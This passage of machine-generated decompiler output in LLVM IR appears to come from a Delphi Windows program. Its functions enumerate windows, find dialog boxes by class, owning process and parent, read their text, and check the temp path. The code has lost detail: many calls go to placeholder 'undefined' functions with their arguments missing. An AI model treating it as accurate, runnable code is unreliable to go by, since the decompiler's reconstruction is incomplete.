  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1796
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1797
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1797
  store i32 4223179, i32* %64, align 4, !insn.addr !1797
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1798
  ret i32 %65, !insn.addr !1799
}

define i32 @function_4070c4() local_unnamed_addr {
dec_label_pc_4070c4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1800
  ret i32 %0, !insn.addr !1800
}

define i32 @function_4070c9() local_unnamed_addr {
dec_label_pc_4070c9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1801
}

define i32 @function_4070cb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4070cb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1802
}

define i32 @function_407100() local_unnamed_addr {
dec_label_pc_407100:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1803
  %1 = call i32 @function_4036b8(), !insn.addr !1804
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1805
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1805
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1805
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1806
  %4 = call i32 @function_403c90(), !insn.addr !1807
  %5 = icmp slt i32 %4, 0, !insn.addr !1808
  br i1 %5, label %dec_label_pc_407188, label %dec_label_pc_407156, !insn.addr !1809

dec_label_pc_407156:                              ; preds = %dec_label_pc_407100
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1810
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1811
  br label %dec_label_pc_4071d4

dec_label_pc_407188:                              ; preds = %dec_label_pc_407100
  %8 = call i32 @function_403c88(), !insn.addr !1812
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1813
  %10 = call i32 @function_403c90(), !insn.addr !1814
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1815
  %12 = call i32 @function_403c90(), !insn.addr !1816
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1817
  %14 = call i32 @function_406fc0(), !insn.addr !1818
  br label %dec_label_pc_4071d4, !insn.addr !1818

dec_label_pc_4071d4:                              ; preds = %dec_label_pc_407156, %dec_label_pc_407188
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1819
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1820
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1821
  ret i32 %16, !insn.addr !1822
}

define i32 @function_4071ef() local_unnamed_addr {
dec_label_pc_4071ef:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1823
  ret i32 %0, !insn.addr !1823
}

define i32 @function_4071f4() local_unnamed_addr {
dec_label_pc_4071f4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1824
}

define i32 @function_4071f6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4071f6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1825
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1825
  %3 = load i32, i32* %2, align 4, !insn.addr !1825
  ret i32 %3, !insn.addr !1826
}

define i32 @function_407200() local_unnamed_addr {
dec_label_pc_407200:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1827
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1827
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1827
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1828
  %2 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1829
  %3 = add i32 %2, 1, !insn.addr !1829
  %4 = icmp eq i32 %3, 0, !insn.addr !1829
  store i32 %3, i32* @global_var_4096dc, align 4, !insn.addr !1829
  %5 = icmp eq i1 %4, false, !insn.addr !1830
  br i1 %5, label %dec_label_pc_407238, label %dec_label_pc_407219, !insn.addr !1830

dec_label_pc_407219:                              ; preds = %dec_label_pc_407200
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1831
  %7 = icmp eq i32 %6, 0, !insn.addr !1831
  br i1 %7, label %dec_label_pc_407228, label %dec_label_pc_407223, !insn.addr !1832

dec_label_pc_407223:                              ; preds = %dec_label_pc_407219
  %8 = call i32 @function_406fc0(), !insn.addr !1833
  br label %dec_label_pc_407228, !insn.addr !1833

dec_label_pc_407228:                              ; preds = %dec_label_pc_407223, %dec_label_pc_407219
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1834
  br label %dec_label_pc_407238, !insn.addr !1834

dec_label_pc_407238:                              ; preds = %dec_label_pc_407228, %dec_label_pc_407200
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1835
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1836
  ret i32 0, !insn.addr !1837
}

define i32 @function_407246() local_unnamed_addr {
dec_label_pc_407246:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1838
  ret i32 %0, !insn.addr !1838
}

define i32 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1839
}

define i32 @function_40724d(i32 %arg1) local_unnamed_addr {
dec_label_pc_40724d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1840
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1841
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1841
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1841
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1842
  %2 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1843
  %3 = add i32 %2, -1, !insn.addr !1843
  %4 = icmp eq i32 %2, 0, !insn.addr !1843
  store i32 %3, i32* @global_var_4096dc, align 4, !insn.addr !1843
  %5 = icmp eq i1 %4, false, !insn.addr !1844
  br i1 %5, label %dec_label_pc_407284, label %dec_label_pc_40726a, !insn.addr !1844

dec_label_pc_40726a:                              ; preds = %dec_label_pc_407250
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1845
  br label %dec_label_pc_407284, !insn.addr !1846

dec_label_pc_407284:                              ; preds = %dec_label_pc_40726a, %dec_label_pc_407250
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1847
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1848
  ret i32 0, !insn.addr !1849
}

define i32 @function_407292() local_unnamed_addr {
dec_label_pc_407292:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1850
  ret i32 %0, !insn.addr !1850
}

define i32 @function_407297() local_unnamed_addr {
dec_label_pc_407297:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1851
}

define i32 @function_407299(i32 %arg1) local_unnamed_addr {
dec_label_pc_407299:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1852
}

define i1 @function_40729c(i8* %pszPath) local_unnamed_addr {
dec_label_pc_40729c:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1853
  ret i1 %0, !insn.addr !1853
}

define i32 @function_4072a4() local_unnamed_addr {
dec_label_pc_4072a4:
  %eax.0.reg2mem = alloca i32, !insn.addr !1854
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1855
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1856
  %2 = icmp eq i32 %1, 0, !insn.addr !1857
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1858
  br i1 %2, label %dec_label_pc_4072da, label %dec_label_pc_4072bc, !insn.addr !1858

dec_label_pc_4072bc:                              ; preds = %dec_label_pc_4072a4
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1855
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1859
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1859
  %7 = load i8, i8* %6, align 1, !insn.addr !1859
  %8 = icmp eq i8 %7, 92, !insn.addr !1859
  br i1 %8, label %dec_label_pc_4072cc, label %dec_label_pc_4072c3, !insn.addr !1860

dec_label_pc_4072c3:                              ; preds = %dec_label_pc_4072bc
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1861
  store i8 92, i8* %9, align 1, !insn.addr !1861
  %10 = or i32 %3, 1, !insn.addr !1862
  %11 = add i32 %1, %10, !insn.addr !1862
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1862
  store i8 0, i8* %12, align 1, !insn.addr !1862
  br label %dec_label_pc_4072cc, !insn.addr !1862

dec_label_pc_4072cc:                              ; preds = %dec_label_pc_4072c3, %dec_label_pc_4072bc
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1863
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1863
  br label %dec_label_pc_4072da, !insn.addr !1863

dec_label_pc_4072da:                              ; preds = %dec_label_pc_4072cc, %dec_label_pc_4072a4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1864
}

define i32 @function_4072e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4072e4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1865
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1866
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1867
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1867
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1867
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1868
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1869
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1869
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1870
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1870
  %5 = icmp eq i1 %4, false, !insn.addr !1871
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1872
  br i1 %5, label %dec_label_pc_40739b, label %dec_label_pc_40731b, !insn.addr !1872

dec_label_pc_40731b:                              ; preds = %dec_label_pc_4072e4
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1873
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1873
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1874
  %8 = icmp eq i32 %7, 32770, !insn.addr !1875
  %9 = icmp eq i1 %8, false, !insn.addr !1876
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1876
  br i1 %9, label %dec_label_pc_40739b, label %dec_label_pc_40732a, !insn.addr !1876

dec_label_pc_40732a:                              ; preds = %dec_label_pc_40731b
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1877
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1877
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1878
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1878
  %13 = add i32 %arg1, 4, !insn.addr !1879
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1879
  %15 = load i32, i32* %14, align 4, !insn.addr !1879
  %16 = icmp eq i32 %15, %12, !insn.addr !1879
  %17 = icmp eq i1 %16, false, !insn.addr !1880
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1880
  br i1 %17, label %dec_label_pc_40739b, label %dec_label_pc_407335, !insn.addr !1880

dec_label_pc_407335:                              ; preds = %dec_label_pc_40732a
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1881
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1881
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1882
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1883
  %21 = load i32, i32* %20, align 4, !insn.addr !1883
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1884
  %23 = icmp eq i32 %21, %22, !insn.addr !1884
  %24 = icmp eq i1 %23, false, !insn.addr !1885
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1885
  br i1 %24, label %dec_label_pc_40739b, label %dec_label_pc_407346, !insn.addr !1885

dec_label_pc_407346:                              ; preds = %dec_label_pc_407335
  %25 = add i32 %arg1, 8, !insn.addr !1886
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1886
  %27 = load i32, i32* %26, align 4, !insn.addr !1886
  %28 = icmp eq i32 %27, 0, !insn.addr !1886
  br i1 %28, label %dec_label_pc_407370, label %dec_label_pc_40734c, !insn.addr !1887

dec_label_pc_40734c:                              ; preds = %dec_label_pc_407346
  %29 = call i32 @function_4074bc(), !insn.addr !1888
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1889
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1890
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_40739b

dec_label_pc_407370:                              ; preds = %dec_label_pc_407346
  %32 = add i32 %arg1, 12, !insn.addr !1891
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1891
  %34 = load i32, i32* %33, align 4, !insn.addr !1891
  %35 = add i32 %arg1, 16, !insn.addr !1892
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1892
  %37 = load i32, i32* %36, align 4, !insn.addr !1892
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1893
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1893
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1893
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1893
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1893
  %43 = add i32 %arg1, 24, !insn.addr !1894
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1894
  store i32 %42, i32* %44, align 4, !insn.addr !1894
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1895
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1895
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1896
  %47 = icmp eq i1 %46, false, !insn.addr !1897
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1898
  br i1 %47, label %dec_label_pc_40739b, label %dec_label_pc_407396, !insn.addr !1898

dec_label_pc_407396:                              ; preds = %dec_label_pc_407370
  %48 = add i32 %arg1, 20, !insn.addr !1899
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1899
  store i32 %arg2, i32* %49, align 4, !insn.addr !1899
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1900
  br label %dec_label_pc_40739b, !insn.addr !1900

dec_label_pc_40739b:                              ; preds = %dec_label_pc_40734c, %dec_label_pc_407396, %dec_label_pc_407370, %dec_label_pc_407335, %dec_label_pc_40732a, %dec_label_pc_40731b, %dec_label_pc_4072e4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1901
  %51 = load i32, i32* %50, align 4, !insn.addr !1901
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1902
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1903
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1903
  store i32 4223933, i32* %53, align 4, !insn.addr !1903
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1904
  ret i32 %54, !insn.addr !1905
}

define i32 @function_4073b6() local_unnamed_addr {
dec_label_pc_4073b6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1906
  ret i32 %0, !insn.addr !1906
}

define i32 @function_4073bb() local_unnamed_addr {
dec_label_pc_4073bb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1907
}

define i32 @function_4073bd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4073bd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1908
}

define i32 @function_4073c8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4073c8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1909
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1910
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1911
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1911
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1911
  %6 = call i32 @function_40441c(), !insn.addr !1912
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1913
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1914
  br label %dec_label_pc_40740c, !insn.addr !1914

dec_label_pc_40740c:                              ; preds = %dec_label_pc_40742b, %dec_label_pc_4073c8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1913
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1913
  store i32 %7, i32* %9, align 4, !insn.addr !1913
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1915
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1915
  store i32 4223716, i32* %11, align 4, !insn.addr !1915
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1916
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1917
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1917
  store i32 1, i32* %14, align 4, !insn.addr !1917
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1918
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1919
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1919
  store i32 0, i32* %16, align 4, !insn.addr !1919
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1920
  %18 = icmp eq i1 %17, false, !insn.addr !1921
  %19 = icmp eq i1 %18, false, !insn.addr !1922
  br i1 %19, label %dec_label_pc_407436, label %dec_label_pc_40742b, !insn.addr !1922

dec_label_pc_40742b:                              ; preds = %dec_label_pc_40740c
  %20 = call i32 @function_40441c(), !insn.addr !1923
  %21 = sub i32 %20, %6, !insn.addr !1924
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1925
  %23 = icmp eq i1 %22, false, !insn.addr !1926
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1926
  br i1 %23, label %dec_label_pc_40740c, label %dec_label_pc_407436, !insn.addr !1926

dec_label_pc_407436:                              ; preds = %dec_label_pc_40742b, %dec_label_pc_40740c
  ret i32 0, !insn.addr !1927
}

define i32 @function_407450() local_unnamed_addr {
dec_label_pc_407450:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1928
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1929
}

define i32 @function_407468(i32 %arg1) local_unnamed_addr {
dec_label_pc_407468:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1930
  %edi.0.reg2mem = alloca i32, !insn.addr !1930
  %ecx.0.reg2mem = alloca i32, !insn.addr !1930
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1931
  br label %2, !insn.addr !1931

; <label>:2:                                      ; preds = %4, %dec_label_pc_407468
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1931
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1931
  br i1 %3, label %10, label %4, !insn.addr !1931

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1931
  %6 = load i8, i8* %5, align 1, !insn.addr !1931
  %7 = icmp eq i8 %6, 0, !insn.addr !1931
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1931
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1931
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1931
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1931
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1931
  br i1 %7, label %10, label %2, !insn.addr !1931

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1932
  ret i32 %11, !insn.addr !1933
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_4074bc() local_unnamed_addr {
dec_label_pc_4074bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1934
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1935
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1935
  %4 = add i32 %3, %1, !insn.addr !1936
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1936
  store i8 0, i8* %5, align 1, !insn.addr !1936
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1937
  ret i32 %6, !insn.addr !1938
}

define i32 @function_4074f0() local_unnamed_addr {
dec_label_pc_4074f0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1939
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1940
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1941
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1941
  %6 = add i32 %5, %3, !insn.addr !1942
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1942
  store i8 0, i8* %7, align 1, !insn.addr !1942
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1943
  ret i32 %8, !insn.addr !1944
}

define i32 @function_407528() local_unnamed_addr {
dec_label_pc_407528:
  %0 = call i32 @function_4034c8(), !insn.addr !1945
  %1 = call i32 @function_4034c8(), !insn.addr !1946
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1947
  ret i32 %2, !insn.addr !1948
}

define i32 @function_407568() local_unnamed_addr {
dec_label_pc_407568:
  %0 = call i32 @function_4034c8(), !insn.addr !1949
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1950
  ret i32 %1, !insn.addr !1951
}

define i32 @function_4075a0() local_unnamed_addr {
dec_label_pc_4075a0:
  %0 = call i32 @function_4036c8(), !insn.addr !1952
  %1 = call i32 @function_4036c8(), !insn.addr !1953
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1954
  %3 = icmp eq i32 %2, 2, !insn.addr !1955
  %4 = zext i1 %3 to i32, !insn.addr !1956
  %5 = and i32 %2, -256, !insn.addr !1956
  %6 = or i32 %5, %4, !insn.addr !1956
  ret i32 %6, !insn.addr !1957
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1958
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1958
  %esp.02.reg2mem = alloca i32, !insn.addr !1958
  %storemerge3.reg2mem = alloca i32, !insn.addr !1958
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1959
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1959
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1959
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1960
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1961
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1962
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1962
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1963
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1963
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1963
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1964
  %9 = icmp eq i1 %8, false, !insn.addr !1965
  %10 = icmp eq i1 %9, false, !insn.addr !1966
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1966
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1966
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1966
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1966
  br i1 %10, label %dec_label_pc_4075f4, label %dec_label_pc_407634, !insn.addr !1966

dec_label_pc_4075f4:                              ; preds = %dec_label_pc_4075d0, %dec_label_pc_4075f4
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_4074bc(), !insn.addr !1967
  %12 = call i32 @function_4075d0(), !insn.addr !1968
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1969
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1969
  store i32 2, i32* %14, align 4, !insn.addr !1969
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1970
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1970
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1970
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1971
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1963
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1963
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1964
  %21 = icmp eq i1 %20, false, !insn.addr !1965
  %22 = icmp eq i1 %21, false, !insn.addr !1966
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1966
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1966
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1966
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1966
  br i1 %22, label %dec_label_pc_4075f4, label %dec_label_pc_407634, !insn.addr !1966

dec_label_pc_407634:                              ; preds = %dec_label_pc_4075f4, %dec_label_pc_4075d0
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1972
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1973
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1974
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1974
  store i32 4224593, i32* %25, align 4, !insn.addr !1974
  %26 = call i32 @"@LStrClr"(), !insn.addr !1975
  ret i32 %26, !insn.addr !1976
}

define i32 @function_40764a() local_unnamed_addr {
dec_label_pc_40764a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1977
  ret i32 %0, !insn.addr !1977
}

define i32 @function_40764f() local_unnamed_addr {
dec_label_pc_40764f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1978
}

define i32 @function_407651(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407651:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1979
}

define i32 @function_40765c() local_unnamed_addr {
dec_label_pc_40765c:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1980
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1980
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1980
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1981
  %2 = call i32 @function_4074f0(), !insn.addr !1982
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1983
  %4 = call i32 @function_4075d0(), !insn.addr !1984
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1985
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1986
  %6 = call i32 @"@LStrClr"(), !insn.addr !1987
  ret i32 %6, !insn.addr !1988
}

define i32 @function_4076bd() local_unnamed_addr {
dec_label_pc_4076bd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1989
  ret i32 %0, !insn.addr !1989
}

define i32 @function_4076c2() local_unnamed_addr {
dec_label_pc_4076c2:
